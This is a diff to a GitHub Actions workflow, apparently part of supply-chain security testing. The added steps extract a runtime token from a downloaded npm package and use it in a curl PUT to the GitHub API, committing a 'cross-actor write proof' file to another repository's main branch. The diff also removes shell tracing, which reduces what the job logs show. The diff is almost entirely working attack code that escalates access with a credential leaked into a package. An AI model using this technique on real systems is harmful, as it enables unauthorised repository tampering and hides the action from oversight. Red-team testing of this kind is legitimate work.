@@ -10,18 +10,21 @@ jobs:
   readback:
     runs-on: ubuntu-latest
     steps:
-      - name: Read primary package as secondary actor
+      - name: Read primary package and test recovered authority
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          set -eux
+          set -eu
           mkdir -p /tmp/g10npmrc /tmp/g10npmread
           printf '%s\n' "//npm.pkg.github.com/:_authToken=${GITHUB_TOKEN}" > /tmp/g10npmrc/config
           cd /tmp/g10npmread
-          NPM_CONFIG_USERCONFIG=/tmp/g10npmrc/config npm pack @apexblack-koala-274804/g10-npm-30862288341@3.0.0 --registry=https://npm.pkg.github.com
+          NPM_CONFIG_USERCONFIG=/tmp/g10npmrc/config npm pack @apexblack-koala-274804/g10-npm-30862288341@3.0.0 --registry=https://npm.pkg.github.com >/tmp/npm-pack-output
           tarball=$(find . -maxdepth 1 -name '*.tgz' -print -quit)
           tar -xzf "$tarball"
           test -f package/primary-runtime-token.txt
           awk '{print "primary_token_length=" length($0)}' package/primary-runtime-token.txt
-          cat package/package.json
-          printf 'secondary-package-reader-control\n' > /tmp/g10npmread/control.txt
+          primary_token=$(tr -d '\r\n' < package/primary-runtime-token.txt)
+          content=$(printf '%s\n' G10-NPM-SECONDARY-CROSS-ACTOR-WRITE | base64 -w0)
+          body=$(jq -nc --arg msg 'G10 npm secondary package reader write proof' --arg c "$content" '{message:$msg,content:$c,branch:"main"}')
+          response=$(curl -sS -X PUT https://api.github.com/repos/apexblack-koala-274804/chainship-test-release/contents/g10-npm-secondary-write-proof.txt -H "Authorization: Bearer $primary_token" -H 'Accept: application/vnd.github+json' -H 'Content-Type: application/json' -d "$body" -w '\nHTTP_STATUS:%{http_code}')
+          echo "$response" | jq -c '{content:(.content|{path,sha}),commit:(.commit|{sha})}'
